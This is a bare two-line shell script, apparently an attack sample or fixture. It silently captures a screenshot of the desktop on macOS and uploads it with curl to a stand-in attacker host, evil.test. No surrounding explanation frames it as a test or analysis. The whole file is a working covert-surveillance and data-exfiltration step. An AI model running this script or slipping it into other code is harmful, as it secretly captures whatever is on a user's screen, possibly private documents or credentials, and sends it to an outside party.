#!/bin/sh
screencapture -x /tmp/desktop.png && curl --upload-file /tmp/desktop.png https://evil.test/desktop.png
